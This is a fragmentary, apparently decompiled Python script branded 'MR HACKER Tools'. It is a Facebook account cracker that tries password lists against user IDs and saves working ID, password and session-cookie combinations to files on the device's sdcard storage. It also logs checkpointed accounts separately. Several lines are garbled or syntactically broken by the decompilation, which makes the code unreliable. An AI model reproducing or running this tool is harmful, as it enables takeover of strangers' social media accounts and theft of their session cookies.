...
os.system('clear')
print(logo)
os.system('espeak -a 300 " Welcome,   to,  MR,  HACKER,  Tools"')
...
def menu():
    ...
    if xd in ('1', '01'):
        clear()
        print('\x1b[1;32m[✓] \x1b[0;37m EXAMPLE \x1b[1;32m: \x1b[1;31m/sdcard/HACKER.txt ')
        linex()
    ...
    if xd in ('2', '02'):
        ...
        return None
    if None in ('3', '03'):
        os.system('xdg-open https://www.facebook.com/MDShimul404?mibextid=ZbWKwL')
        menu()
        return None
    if None in ('0', '00'):
...
def api2(ids, names, passlist):
    global loop
    sys.stdout.write('\r\r \x1b[1;32mM\x1b[0;37m\x1b[1;32mR\x1b[0;37m\x1b[1;32m-HACKER-\x1b[1;31mM2 \x1b[0;37m[✓]\x1b[1;36m %s\x1b[0;37m [✓]\x1b[1;32m OK \x1b[0;37m[✓]\x1b[1;32m %s ' % (loop, len(oks)))
    sys.stdout.flush()
    sys.stdout.flush()
    fn = names.split(' ')[0]
    ln = names.split(' ')[1]
...
i['name'] + '=' + i['value']None)(po['session_cookies']())
            ...
            print(f'''\x1b[1;32m[COKIES-🍪] {coki}''')
            linex()
            open('/sdcard/HACKER-FILE-M2-COOKIE.txt', 'a').write(ids + '|' + pas + '|' + coki + '\n')
            oks.append(ids)
            ';'.join
        if 'www.facebook.com' in po['error']['message']:
            open('/sdcard/HACKER-CP.txt', 'a').write(ids + '|' + pas + '\n')
            cps.append(ids)
            'button_with_disabled'
        loop += 1
        return None
...
def api3(ids, names, passlist):
    global loop
    sys.stdout.write('\r\r \x1b[1;32mM\x1b[0;37m\x1b[1;32mR\x1b[0;37m\x1b[1;32m-HACKER-\x1b[1;31mM3 \x1b[0;37m[✓]\x1b[1;36m %s\x1b[0;37m [✓]\x1b[1;32m OK \x1b[0;37m[✓]\x1b[1;32m %s ' % (loop, len(oks)))
    sys.stdout.flush()
    sys.stdout.flush()
    fn = names.split(' ')[0]
    ln = names.split(' ')[1]
...
i['name'] + '=' + i['value']None)(po['session_cookies']())
            ...
            print(f'''\x1b[1;32m[COKIES-🍪] {coki}''')
            linex()
            open('/sdcard/HACKER-FILE-M3-COOKIE.txt', 'a').write(ids + '|' + pas + '|' + coki + '\n')
            oks.append(ids)
            ';'.join
        if 'www.facebook.com' in po['error']['message']:
            open('/sdcard/PAPI-CP.txt', 'a').write(ids + '|' + pas + '\n')
...
[ key + '=' + value ])(session.cookies.get_dict().items()())
            ...
            if 'Photoshop' in res:
                if 'Y' in ck:
                    print(f'''\r\r\r\r\x1b[1;32m[HACKER-OK]\x1b[1;33m {cid} | {pas}''')
                    print(f'''\r\r\x1b[1;36m[COKIES-🍪] {coki}''')
                    linex()
                    open('/sdcard/HACKER-OK.txt', 'a').write(cid + '|' + pas + '\n')
                    open('/sdcard/HACKER-OK-COOKIE.txt', 'a').write(cid + '|' + pas + '|' + coki + '\n')
                    oks.append(cid)
                    ';'.join
                print(f'''\r\r\r\r\x1b[1;32m[HACKER-OK]\x1b[1;36m {cid} | {pas}''')
                open('/sdcard/HACKER-OK.txt', 'a').write(cid + '|' + pas + '\n')
                open('/sdcard/HACKER-OK-COOKIE.txt', 'a').write(cid + '|' + pas + '|' + coki + '\n')
                oks.append(cid)
                '1'
